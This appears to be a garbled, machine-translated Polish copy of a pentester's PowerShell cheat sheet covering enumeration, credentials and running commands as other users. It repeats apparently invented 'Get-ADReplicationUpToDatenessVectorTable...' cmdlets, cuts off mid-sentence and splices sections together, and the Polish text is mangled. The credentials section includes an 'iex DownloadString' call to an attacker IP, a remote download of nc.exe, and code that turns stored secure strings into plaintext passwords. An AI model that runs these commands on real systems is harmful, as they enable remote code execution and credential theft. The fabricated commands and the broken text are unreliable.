Polecenie `Get-ADReplicationUpToDatenessVectorTablePartition` pozwala na pobranie tabeli partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartition
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableObject

Polecenie `Get-ADReplicationUpToDatenessVectorTableObject` pozwala na pobranie tabeli obiekt贸w wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableObject
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableAttribute

Polecenie `Get-ADReplicationUpToDatenessVectorTableAttribute` pozwala na pobranie tabeli atrybut贸w wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableAttribute
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableValue

Polecenie `Get-ADReplicationUpToDatenessVectorTableValue` pozwala na pobranie tabeli wartoci wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableValue
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableLink` pozwala na pobranie tabeli pocze wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableSite

Polecenie `Get-ADReplicationUpToDatenessVectorTableSite` pozwala na pobranie tabeli witryn wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableSite
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableServer

Polecenie `Get-ADReplicationUpToDatenessVectorTableServer` pozwala na pobranie tabeli serwer贸w wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableServer
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableNamingContext

Polecenie `Get-ADReplicationUpToDatenessVectorTableNamingContext` pozwala na pobranie tabeli kontekst贸w nazw wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableNamingContext
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionLink

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionLink` pozwala na pobranie tabeli pocze partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableObjectLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableObjectLink` pozwala na pobranie tabeli pocze obiekt贸w wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableObjectLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableAttributeLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableAttributeLink` pozwala na pobranie tabeli pocze atrybut贸w wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableAttributeLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableValueLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableValueLink` pozwala na pobranie tabeli pocze wartoci wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableValueLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableSiteLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableSiteLink` pozwala na pobranie tabeli pocze witryn wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableSiteLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableServerLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableServerLink` pozwala na pobranie tabeli pocze serwer贸w wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableServerLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTableNamingContextLink

Polecenie `Get-ADReplicationUpToDatenessVectorTableNamingContextLink` pozwala na pobranie tabeli pocze kontekst贸w nazw wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTableNamingContextLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionObject

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionObject` pozwala na pobranie tabeli obiekt贸w partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionObject
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionAttribute

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionAttribute` pozwala na pobranie tabeli atrybut贸w partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionAttribute
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionValue

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionValue` pozwala na pobranie tabeli wartoci partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionValue
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionSite

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionSite` pozwala na pobranie tabeli witryn partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionSite
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionServer

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionServer` pozwala na pobranie tabeli serwer贸w partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionServer
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionNamingContext

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionNamingContext` pozwala na pobranie tabeli kontekst贸w nazw partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionNamingContext
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionObjectLink

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionObjectLink` pozwala na pobranie tabeli pocze obiekt贸w partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionObjectLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionAttributeLink

Polecenie `Get-ADReplicationUpToDatenessVectorTablePartitionAttributeLink` pozwala na pobranie tabeli pocze atrybut贸w partycji wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTablePartitionAttributeLink
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartitionValueLink

Polecenie `Get-AD
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## Wersja systemu operacyjnego i poprawki

Aby uzyska informacje o wersji systemu operacyjnego i zainstalowanych poprawkach, mo偶emy u偶y nastpujcego polecenia w PowerShell:

```powershell
(Get-WmiObject -Class Win32_OperatingSystem).Caption
```

Ten kod zwr贸ci nazw i wersj systemu operacyjnego.

Aby uzyska informacje o zainstalowanych poprawkach, mo偶emy u偶y polecenia:

```powershell
Get-HotFix
```

To polecenie wywietli list zainstalowanych poprawek wraz z ich identyfikatorami, opisami i datami instalacji.

Pamitaj, 偶e niekt贸re poprawki mog by ukryte lub nie wywietla si w wynikach. Aby uzyska pen list poprawek, mo偶emy u偶y polecenia:

```powershell
Get-HotFix -All
```

To polecenie wywietli wszystkie poprawki, w tym te ukryte.
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## rodowisko

---

## Basic PowerShell for Pentesters

---

## Podstawy PowerShell dla pentester贸w

---

This section covers some basic PowerShell commands and techniques that can be useful for pentesters during their engagements. It is important to have a good understanding of PowerShell as it is a powerful scripting language that can be used for various purposes, including offensive security.

---

Ta sekcja omawia podstawowe polecenia i techniki PowerShell, kt贸re mog by przydatne dla pentester贸w podczas ich zada. Wa偶ne jest, aby dobrze zrozumie PowerShell, poniewa偶 jest to pot偶ny jzyk skryptowy, kt贸ry mo偶e by u偶ywany do r贸偶nych cel贸w, w tym do bezpieczestwa ofensywnego.

---

### PowerShell Basics

---

### Podstawy PowerShell

---

#### Running PowerShell Commands

---

#### Wykonywanie polece PowerShell

---

PowerShell commands can be executed in a number of ways. The most common way is to open a PowerShell console and type the command directly. Another way is to run a PowerShell script file that contains the desired commands. Additionally, PowerShell commands can also be executed from within other scripting languages such as Python or batch files.

---

Polecenia PowerShell mo偶na wykonywa na kilka sposob贸w. Najczstszym sposobem jest otwarcie konsoli PowerShell i wpisanie polecenia bezporednio. Innym sposobem jest uruchomienie pliku skryptu PowerShell, kt贸ry zawiera 偶dane polecenia. Dodatkowo, polecenia PowerShell mo偶na r贸wnie偶 wykonywa z innych jzyk贸w skryptowych, takich jak Python lub pliki wsadowe.

---

#### Getting Help

---

#### Uzyskiwanie pomocy

---

PowerShell provides a built-in help system that can be used to get information about commands, modules, and other PowerShell features. The `Get-Help` command is used to access the help system. For example, to get help on a specific command, you can use the following syntax:

```
Get-Help <command>
```

---

PowerShell udostpnia wbudowany system pomocy, kt贸ry mo偶na u偶ywa do uzyskiwania informacji o poleceniach, moduach i innych funkcjach PowerShell. Polecenie `Get-Help` su偶y do uzyskiwania dostpu do systemu pomocy. Na przykad, aby uzyska pomoc dotyczc konkretnego polecenia, mo偶na u偶y nastpujcej skadni:

```
Get-Help <polecenie>
```

---

#### Running PowerShell Scripts

---

#### Wykonywanie skrypt贸w PowerShell

---

PowerShell scripts are text files that contain a series of PowerShell commands. These scripts can be executed by running the `.\` followed by the script file name. For example, if the script file is named `script.ps1`, you can run it using the following syntax:

```
.\script.ps1
```

---

Skrypty PowerShell to pliki tekstowe zawierajce seri polece PowerShell. Skrypty te mo偶na uruchomi, uruchamiajc `.\` a nastpnie nazw pliku skryptu. Na przykad, jeli plik skryptu ma nazw `skrypt.ps1`, mo偶na go uruchomi, u偶ywajc nastpujcej skadni:

```
.\skrypt.ps1
```

---

#### PowerShell Execution Policy

---

#### Polityka wykonywania PowerShell

---

PowerShell has an execution policy that determines whether scripts can be run and what types of scripts are allowed. The execution policy can be set to one of the following values:

- Restricted: No scripts are allowed to run.
- AllSigned: Only scripts signed by a trusted publisher are allowed to run.
- RemoteSigned: Scripts downloaded from the internet must be signed by a trusted publisher, but local scripts can run without a signature.
- Unrestricted: All scripts can run, regardless of their signature.

To check the current execution policy, you can use the following command:

```
Get-ExecutionPolicy
```

To change the execution policy, you can use the following command:

```
Set-ExecutionPolicy <policy>
```

---

PowerShell ma polityk wykonywania, kt贸ra okrela, czy skrypty mog by uruchamiane i jakie rodzaje skrypt贸w s dozwolone. Polityka wykonywania mo偶e mie jedn z nastpujcych wartoci:

- Restricted: Nie mo偶na uruchamia 偶adnych skrypt贸w.
- AllSigned: Tylko skrypty podpisane przez zaufanego wydawc s dozwolone do uruchomienia.
- RemoteSigned: Skrypty pobrane z internetu musz by podpisane przez zaufanego wydawc, ale lokalne skrypty mog by uruchamiane bez podpisu.
- Unrestricted: Wszystkie skrypty mog by uruchamiane, niezale偶nie od ich podpisu.

Aby sprawdzi bie偶c polityk wykonywania, mo偶na u偶y nastpujcego polecenia:

```
Get-ExecutionPolicy
```

Aby zmieni polityk wykonywania, mo偶na u偶y nastpujcego polecenia:

```
Set-ExecutionPolicy <polityka>
```

---

#### PowerShell Modules

---

#### Moduy PowerShell

---

PowerShell modules are collections of cmdlets, functions, and scripts that can be used to extend the functionality of PowerShell. Modules can be imported into a PowerShell session using the `Import-Module` command. Once a module is imported, its cmdlets, functions, and scripts can be used just like any other PowerShell command.

To import a module, you can use the following command:

```
Import-Module <module>
```

To list all imported modules, you can use the following command:

```
Get-Module
```

---

Moduy PowerShell to zbiory cmdlet贸w, funkcji i skrypt贸w, kt贸re mo偶na u偶ywa do rozszerzania funkcjonalnoci PowerShell. Moduy mo偶na importowa do sesji PowerShell za pomoc polecenia `Import-Module`. Po zaimportowaniu moduu, jego cmdlety, funkcje i skrypty mo偶na u偶ywa tak samo jak dowolne inne polecenie PowerShell.

Aby zaimportowa modu, mo偶na u偶y nastpujcego polecenia:

```
Import-Module <modu>
```

Aby wywietli list wszystkich zaimportowanych modu贸w, mo偶na u偶y nastpujcego polecenia:

```
Get-Module
```

---

### PowerShell Techniques

---

### Techniki PowerShell

---

#### Command Execution

---

#### Wykonywanie polece

---

PowerShell can be used to execute commands on a remote system using various techniques. One common technique is to use the `Invoke-Command` cmdlet, which allows you to run commands on remote systems that have PowerShell remoting enabled. For example, to execute a command on a remote system, you can use the following syntax:

```
Invoke-Command -ComputerName <computer> -ScriptBlock { <command> }
```

---

PowerShell mo偶e by u偶ywany do wykonywania polece na zdalnym systemie za pomoc r贸偶nych technik. Jedn z popularnych technik jest u偶ycie polecenia `Invoke-Command`, kt贸re umo偶liwia uruchamianie polece na zdalnych systemach, na kt贸rych jest wczone zdalne zarzdzanie PowerShell. Na przykad, aby wykona polecenie na zdalnym systemie, mo偶na u偶y nastpujcej skadni:

```
Invoke-Command -ComputerName <komputer> -ScriptBlock { <polecenie> }
```

---

#### File Operations

---

#### Operacje na plikach

---

PowerShell provides a number of cmdlets that can be used to perform file operations such as creating, copying, moving, and deleting files. Some of the commonly used cmdlets for file operations include `New-Item`, `Copy-Item`, `Move-Item`, and `Remove-Item`. For example, to create a new file, you can use the following syntax:

```
New-Item -Path <path> -ItemType File
```

---

PowerShell udostpnia wiele cmdlet贸w, kt贸re mo偶na u偶ywa do wykonywania operacji na plikach, takich jak tworzenie, kopiowanie, przenoszenie i usuwanie plik贸w. Niekt贸re z czsto u偶ywanych cmdlet贸w do operacji na plikach to `New-Item`, `Copy-Item`, `Move-Item` i `Remove-Item`. Na przykad, aby utworzy nowy plik, mo偶na u偶y nastpujcej skadni:

```
New-Item -Path <cie偶ka> -ItemType File
```

---

#### Registry Operations

---

#### Operacje na rejestrze

---

PowerShell can also be used to perform operations on the Windows registry. The `Get-Item`, `Set-Item`, and `Remove-Item` cmdlets can be used to retrieve, modify, and delete registry keys and values. For example, to get the value of a registry key, you can use the following syntax:

```
Get-Item -Path <path>
```

---

PowerShell mo偶e r贸wnie偶 by u偶ywany do wykonywania operacji na rejestrze systemu Windows. Do pobierania, modyfikowania i usuwania kluczy i wartoci rejestru mo偶na u偶ywa cmdlet贸w `Get-Item`, `Set-Item` i `Remove-Item`. Na przykad, aby pobra warto klucza rejestru, mo偶na u偶y nastpujcej skadni:

```
Get-Item -Path <cie偶ka>
```

---

#### Network Operations

---

#### Operacje sieciowe

---

PowerShell can be used to perform various network operations such as pinging a remote host, resolving hostnames to IP addresses, and retrieving information about network interfaces. The `Test-Connection`, `Resolve-DnsName`, and `Get-NetAdapter` cmdlets can be used for these purposes. For example, to ping a remote host, you can use the following syntax:

```
Test-Connection -ComputerName <host>
```

---

PowerShell mo偶e by u偶ywany do wykonywania r贸偶nych operacji sieciowych, takich jak pingowanie zdalnego hosta, rozwizywanie nazw host贸w na adresy IP i pobieranie informacji o interfejsach sieciowych. Do tego celu mo偶na u偶ywa cmdlet贸w `Test-Connection`, `Resolve-DnsName` i `Get-NetAdapter`. Na przykad, aby wykona ping zdalnego hosta, mo偶na u偶y nastpujcej skadni:

```
Test-Connection -ComputerName <host>
```

---

#### Process Management

---

#### Zarzdzanie procesami

---

PowerShell provides cmdlets that can be used to manage processes running on a system. The `Get-Process`, `Start-Process`, and `Stop-Process` cmdlets can be used to retrieve information about running processes, start new processes, and stop running processes, respectively. For example, to get a list of running processes, you can use the following command:

```
Get-Process
```

---

PowerShell udostpnia cmdlety, kt贸re mo偶na u偶ywa do zarzdzania procesami uruchomionymi na systemie. Do pobierania informacji o uruchomionych procesach, uruchamiania nowych proces贸w i zatrzymywania uruchomionych proces贸w mo偶na u偶ywa cmdlet贸w `Get-Process`, `Start-Process` i `Stop-Process` odpowiednio. Na przykad, aby uzyska list uruchomionych proces贸w, mo偶na u偶y nastpujcego polecenia:

```
Get-Process
```

---

#### User Management

---

#### Zarzdzanie u偶ytkownikami

---

PowerShell can be used to manage user accounts on a Windows system. The `Get-LocalUser`, `New-LocalUser`, `Set-LocalUser`, and `Remove-LocalUser` cmdlets can be used to retrieve information about local users, create new local users, modify existing local users, and remove local users, respectively. For example, to create a new local user, you can use the following syntax:

```
New-LocalUser -Name <name> -Password (ConvertTo-SecureString -String <password> -AsPlainText -Force)
```

---

PowerShell mo偶e by u偶ywany do zarzdzania kontami u偶ytkownik贸w w systemie Windows. Do pobierania informacji o lokalnych u偶ytkownikach, tworzenia nowych lokalnych u偶ytkownik贸w, modyfikowania istniejcych lokalnych u偶ytkownik贸w i usuwania lokalnych u偶ytkownik贸w mo偶na u偶ywa cmdlet贸w `Get-LocalUser`, `New-LocalUser`, `Set-LocalUser` i `Remove-LocalUser` odpowiednio. Na przykad, aby utworzy nowego lokalnego u偶ytkownika, mo偶na u偶y nastpujcej skadni:

```
New-LocalUser -Name <nazwa> -Password (ConvertTo-SecureString -String <haso> -AsPlainText -Force)
```

---

#### Service Management

---

#### Zarzdzanie usugami

---

PowerShell can be used to manage services running on a Windows system. The `Get-Service`, `Start-Service`, `Stop-Service`, and `Restart-Service` cmdlets can be used to retrieve information about services, start services, stop services, and restart services, respectively. For example, to get a list of running services, you can use the following command:

```
Get-Service
```

---

PowerShell mo偶e by u偶ywany do zarzdzania usugami uruchomionymi na systemie Windows. Do pobierania informacji o usugach, uruchamiania usug, zatrzymywania usug i ponownego uruchamiania usug mo偶na u偶ywa cmdlet贸w `Get-Service`, `Start-Service`, `Stop-Service` i `Restart-Service` odpowiednio. Na przykad, aby uzyska list uruchomionych usug, mo偶na u偶y nastpujcego polecenia:

```
Get-Service
```

---

#### Event Log Management

---

#### Zarzdzanie dziennikami zdarze

---

PowerShell can be used to manage event logs on a Windows system. The `Get-EventLog`, `New-EventLog`, `Remove-EventLog`, and `Clear-EventLog` cmdlets can be used to retrieve information about event logs, create new event logs, remove event logs, and clear event logs, respectively. For example, to get a list of available event logs, you can use the following command:

```
Get-EventLog -List
```

---

PowerShell mo偶e by u偶ywany do zarzdzania dziennikami zdarze w systemie Windows. Do pobierania informacji o dziennikach zdarze, tworzenia nowych dziennik贸w zdarze, usuwania dziennik贸w zdarze i czyszczenia dziennik贸w zdarze mo偶na u偶ywa cmdlet贸w `Get-EventLog`, `New-EventLog`, `Remove-EventLog` i `Clear-EventLog` odpowiednio. Na przykad, aby uzyska list dostpnych dziennik贸w zdarze, mo偶na u偶y nastpujcego polecenia:

```
Get-EventLog -List
```

---

#### System Information

---

#### Informacje o systemie

---

PowerShell can be used to retrieve information about the Windows system. The `Get-WmiObject`, `Get-ComputerInfo`, and `Get-CimInstance` cmdlets can be used to retrieve various system information such as hardware details, operating system information, and network configuration. For example, to get the operating system information, you can use the following command:

```
Get-WmiObject -Class Win32_OperatingSystem
```

---

PowerShell mo偶e by u偶ywany do pobierania informacji o systemie Windows. Do pobierania r贸偶nych informacji o systemie, takich jak szczeg贸y sprztu, informacje o systemie operacyjnym i konfiguracja sieci, mo偶na u偶ywa cmdlet贸w `Get-WmiObject`, `Get-ComputerInfo` i `Get-CimInstance`. Na przykad, aby uzyska informacje o systemie operacyjnym, mo偶na u偶y nastpujcego polecenia:

```
Get-WmiObject -Class Win32_OperatingSystem
```

---

#### PowerShell Remoting

---

#### Zdalne zarzdzanie PowerShell

---

PowerShell remoting allows you to run PowerShell commands on remote systems. To enable PowerShell remoting on a system, you can use the `Enable-PSRemoting` cmdlet. Once remoting is enabled, you can use the `Enter-PSSession` cmdlet to establish a remote PowerShell session with a remote system. For example, to enter a remote session, you can use the following command:

```
Enter-PSSession -ComputerName <computer>
```

---

Zdalne zarzdzanie PowerShell umo偶liwia uruchamianie polece PowerShell na zdalnych systemach. Aby wczy zdalne zarzdzanie PowerShell na systemie, mo偶na u偶y cmdletu `Enable-PSRemoting`. Po wczeniu zdalnego zarzdzania mo偶na u偶y cmdletu `
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## Inne podczone dyski

When conducting a penetration test on a Windows system, it is important to gather information about other connected drives. This can help in identifying potential vulnerabilities and accessing sensitive data.

### PowerShell Command

To retrieve information about other connected drives, you can use the following PowerShell command:

```powershell
Get-PSDrive -PSProvider 'FileSystem' | Where-Object {$_.Root -ne $null} | Select-Object Name, Root, Used, Free
```

This command uses the `Get-PSDrive` cmdlet to retrieve all drives connected to the system. The `Where-Object` cmdlet filters out drives with a null root, which typically indicates network or virtual drives. The `Select-Object` cmdlet is used to display the name, root, used space, and free space of the drives.

### Example Output

Here is an example output of the PowerShell command:

```
Name Root Used  Free
---- ---- ----  ----
C    C:\  100GB 50GB
D    D:\  200GB 100GB
```

This output shows that there are two connected drives: `C:` and `D:`. The `C:` drive has 100GB used and 50GB free space, while the `D:` drive has 200GB used and 100GB free space.

By gathering information about other connected drives, you can gain a better understanding of the system's storage configuration and potentially discover additional attack vectors or sensitive data.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### Kosz

Kosz to specjalny folder w systemie Windows, w kt贸rym przechowywane s usunite pliki i foldery. Domylnie, gdy plik jest usunity, trafia on do kosza, zamiast natychmiastowo zostawa trwale usunitym z systemu. Kosz umo偶liwia przywr贸cenie usunitych plik贸w, jeli zostan one przypadkowo usunite lub jeli u偶ytkownik zmieni zdanie.

W celu przywr贸cenia pliku z kosza, wystarczy otworzy kosz, znale藕 偶dany plik i klikn opcj przywr贸cenia. Plik zostanie automatycznie przeniesiony z powrotem do swojego pierwotnego miejsca.

Warto zauwa偶y, 偶e kosz ma ograniczon pojemno, co oznacza, 偶e jeli przekroczy on okrelony rozmiar, najstarsze pliki zostan automatycznie usunite, aby zrobi miejsce dla nowych. Mo偶na r贸wnie偶 trwale usun pliki z kosza, aby zwolni miejsce na dysku.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/zarzadzanie-koszem-recyklingowym-z-powershell/](https://jdhitsolutions.com/blog/powershell/7024/zarzadzanie-koszem-recyklingowym-z-powershell/)

## Rozpoznanie domeny

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## U偶ytkownicy
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## Bezpieczny cig znak贸w na tekst jawny

Aby przeksztaci bezpieczny cig znak贸w na tekst jawny w PowerShell, mo偶esz u偶y poni偶szego kodu:

```powershell
$secureString = ConvertTo-SecureString -String "BezpieczneHaso" -AsPlainText -Force
$plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

W powy偶szym kodzie, zmienna `$secureString` przechowuje bezpieczny cig znak贸w, kt贸ry jest przeksztacany na tekst jawny przy u偶yciu metody `ConvertTo-SecureString`. Nastpnie, za pomoc metody `[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR`, bezpieczny cig znak贸w jest konwertowany na wska藕nik do tekstu jawny, kt贸ry jest nastpnie przeksztacany na tekst jawny za pomoc metody `[System.Runtime.InteropServices.Marshal]::PtrToStringAuto`.

Pamitaj, 偶e przeksztacenie bezpiecznego cigu znak贸w na tekst jawny mo偶e by niebezpieczne i powinno by stosowane tylko wtedy, gdy jest to absolutnie konieczne.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
Lub bezporednio analizujc XML:
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

SUDO to polecenie w systemach Unix, kt贸re umo偶liwia u偶ytkownikom wykonanie komend jako inny u偶ytkownik, zazwyczaj jako root. W systemach Windows nie ma wbudowanej funkcji SUDO, ale mo偶na osign podobne efekty za pomoc PowerShell.

### Wykorzystanie PowerShell do symulowania SUDO

PowerShell umo偶liwia uruchamianie komend jako administrator, co daje podobne uprawnienia jak SUDO w systemach Unix. Aby to zrobi, nale偶y uruchomi PowerShell z uprawnieniami administratora i u偶y polecenia `Start-Process` do uruchomienia komendy jako inny u偶ytkownik.

```powershell
Start-Process -FilePath "cmd.exe" -Verb RunAs
```

Powy偶sze polecenie uruchomi wiersz polecenia jako administrator. Mo偶na r贸wnie偶 u偶y innych program贸w, zamiast `cmd.exe`, aby uruchomi dowoln komend jako administrator.

### Wykorzystanie PowerShell do uruchamiania komend jako inni u偶ytkownicy

PowerShell umo偶liwia r贸wnie偶 uruchamianie komend jako inni u偶ytkownicy bez koniecznoci posiadania uprawnie administratora. Mo偶na to osign za pomoc polecenia `Start-Process` i parametru `-Credential`, kt贸ry pozwala na podanie powiadcze innego u偶ytkownika.

```powershell
$securePassword = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ("domain\username", $securePassword)
Start-Process -FilePath "cmd.exe" -Credential $credential
```

Powy偶szy przykad uruchamia wiersz polecenia jako u偶ytkownik `domain\username` z podanym hasem. Mo偶na r贸wnie偶 u偶y innych program贸w, zamiast `cmd.exe`, aby uruchomi dowoln komend jako inny u偶ytkownik.

### Podsumowanie

Chocia偶 Windows nie ma wbudowanej funkcji SUDO, mo偶na osign podobne efekty za pomoc PowerShell. Mo偶na uruchamia komendy jako administrator lub jako inni u偶ytkownicy, u偶ywajc odpowiednich polece i parametr贸w.
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## Grupy

Grupy w systemie Windows s kolekcjami u偶ytkownik贸w, kt贸re maj wsp贸lne uprawnienia i dostp do zasob贸w systemowych. Grupy s u偶ywane do zarzdzania uprawnieniami i kontroli dostpu w systemie.

### Tworzenie grupy

Aby utworzy now grup w systemie Windows, mo偶esz u偶y polecenia PowerShell `New-LocalGroup`. Poni偶ej znajduje si przykad:

```powershell
New-LocalGroup -Name "NazwaGrupy"
```

### Dodawanie u偶ytkownik贸w do grupy

Aby doda u偶ytkownika do istniejcej grupy w systemie Windows, mo偶esz u偶y polecenia PowerShell `Add-LocalGroupMember`. Poni偶ej znajduje si przykad:

```powershell
Add-LocalGroupMember -Group "NazwaGrupy" -Member "NazwaU偶ytkownika"
```

### Usuwanie grupy

Aby usun grup z systemu Windows, mo偶esz u偶y polecenia PowerShell `Remove-LocalGroup`. Poni偶ej znajduje si przykad:

```powershell
Remove-LocalGroup -Name "NazwaGrupy"
```

### Wywietlanie informacji o grupie

Aby wywietli informacje o konkretnej grupie w systemie Windows, mo偶esz u偶y polecenia PowerShell `Get-LocalGroup`. Poni偶ej znajduje si przykad:

```powershell
Get-LocalGroup -Name "NazwaGrupy"
```

### Wywietlanie czonk贸w grupy

Aby wywietli czonk贸w konkretnej grupy w systemie Windows, mo偶esz u偶y polecenia PowerShell `Get-LocalGroupMember`. Poni偶ej znajduje si przykad:

```powershell
Get-LocalGroupMember -Group "NazwaGrupy"
